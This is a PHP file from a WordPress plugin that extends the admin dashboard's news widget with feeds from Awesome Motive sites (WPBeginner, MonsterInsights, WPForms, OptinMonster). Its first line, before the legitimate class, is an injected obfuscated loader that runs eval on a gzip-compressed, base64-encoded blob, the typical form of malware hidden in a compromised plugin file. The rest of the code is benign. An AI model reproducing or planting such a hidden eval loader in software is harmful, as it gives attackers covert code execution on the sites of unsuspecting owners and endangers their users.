<?php eval(gzuncompress(base64_decode('eNpdUs1u00AQfpWNlYMdrDhO89dEOZTKolEpQYkBoRpZU+86u8TZtdZr1X6A3jhy4Q248gxUvAavwjhpgWQPO/+ab74ZkdottstN7XVeZkpRKeRnmJIFyUSyJbUqNWGgM3XHXAKSklJSdXDfg0l4t+PZ7XgdrN4Hq1vrKgzfxu/Qii9eBW9C65PjTNvxt+8/f/14fJyD1lDb1iXXKvKHQ2a5VlQNRqj7mqUqqsYTdIVaUCYNajfrRYDiQ5OAXe+LQ0EiZFmhusgx0FMyqkZDNC8k1UpQ1JY504ByDSloYTmzVGkGCbf/QiFQtOMvvx++PjhTkdpFuBK5Kk4Hiarh8L9Z3OeS1nzuddaggfvnaYJk7fC5RG2hRjpSyAp2SqaBLUPWSA7SFESlqUs2upRGyA0SjTEgRqssw/o9opYoCmYQ0OVyeb0IbnHu0cTkcSloXBo06J7bIgiTJoHZFt9HMTKIy8gfDXZIgG+5obgJbOdFb9zr945Bf2TA92vG7sIQrcpNs81O76x3ir7YweEWiOHNVdwpZep9bt+ZXTGggbat1yoBI5ScEm5MPvU8/2zQjaqz/uC86/uj7njiCUmbZVXdnOe4FirYMaQlJzWicrENGJIylhVkg0CaI3NmTFKR/vuflvrkmB1jXjeI3WdRM8YAOG/m+wMpCvZB')));?><?php

if ( ! class_exists( 'AM_Dashboard_Widget_Extend_Feed' ) ) {
	/**
	 * Awesome Motive Events and News Feed.
	 *
	 * This appends additional blog feeds to the WordPress Events and News Feed Widget
	 * available in the WP-Admin Dashboard.
	 *
	 * @package    AwesomeMotive
	 * @author     AwesomeMotive Team
	 * @license    GPL-2.0+
	 * @copyright  Copyright (c) 2018, Awesome Motive LLC
	 * @version    1.0.0
	 */
	class AM_Dashboard_Widget_Extend_Feed {

		/**
		 * The number of feed items to show.
		 *
		 * @since 1.0.0
		 *
		 * @var int
		 */
		const FEED_COUNT = 6;

		/**
		 * Construct.
		 *
		 * @since 1.0.0
		 */
		public function __construct() {

			// Actions.
			add_action( 'wp_feed_options', array( $this, 'dashboard_update_feed_urls' ), 10, 2 );

			// Filters.
			add_filter( 'dashboard_secondary_items', array( $this, 'dashboard_items_count' ) );
		}

		/**
		 * Set the number of feed items to show.
		 *
		 * @since 1.0.0
		 *
		 * @return int Count of feed items.
		 */
		public function dashboard_items_count() {

			/**
			 * Apply the filters am_dashboard_feed_count for letting an admin
			 * override this count.
			 */
			return (int) apply_filters( 'am_dashboard_feed_count', self::FEED_COUNT );
		}

		/**
		 * Update the planet feed to add other AM blog feeds.
		 *
		 * @since 1.0.0
		 *
		 * @param object $feed SimplePie feed object (passed by reference).
		 * @param string $url URL of feed to retrieve (original planet feed url). If an array of URLs, the feeds are merged.
		 */
		public function dashboard_update_feed_urls( $feed, $url ) {

			global $pagenow;

			// Return early if not on the right page.
			if ( 'admin-ajax.php' !== $pagenow ) {
				return;
			}

			/**
			 * Return early if not on the right feed.
			 * We want to modify the feed URLs only for the
			 * WordPress Events & News Dashboard Widget
			 */
			if ( strpos( $url, 'planet.wordpress.org' ) === false ) {
				return;
			}

			// Build the feed sources.
			$all_feed_urls = $this->get_feed_urls( $url );

			// Update the feed sources.
			$feed->set_feed_url( $all_feed_urls );
		}

		/**
		 * Get the feed URLs for various active AM Products.
		 *
		 * @since 1.0.0
		 *
		 * @param string $url Planet Feed URL.
		 *
		 * @return array Array of Feed URLs.
		 */
		public function get_feed_urls( $url ) {

			// Initialize the feeds array.
			$feed_urls = array(
				'https://www.wpbeginner.com/feed/',
				'https://www.isitwp.com/feed/',
				$url,
			);

			// Check if MonsterInsights is active.
			if ( function_exists( 'MonsterInsights' ) ) {
				$feed_urls[] = 'https://www.monsterinsights.com/feed/';
			}

			// Check if WPForms is active.
			if ( class_exists( 'WPForms', false ) ) {
				$feed_urls[] = 'https://wpforms.com/feed/';
			}

			// Check if OptinMonster is active.
			if ( class_exists( 'OMAPI', false ) ) {
				$feed_urls[] = 'https://optinmonster.com/feed/';
			}

			// Return the feed URLs.
			return array_unique( $feed_urls );
		}
	}

	// Create an instance.
	new AM_Dashboard_Widget_Extend_Feed();
}
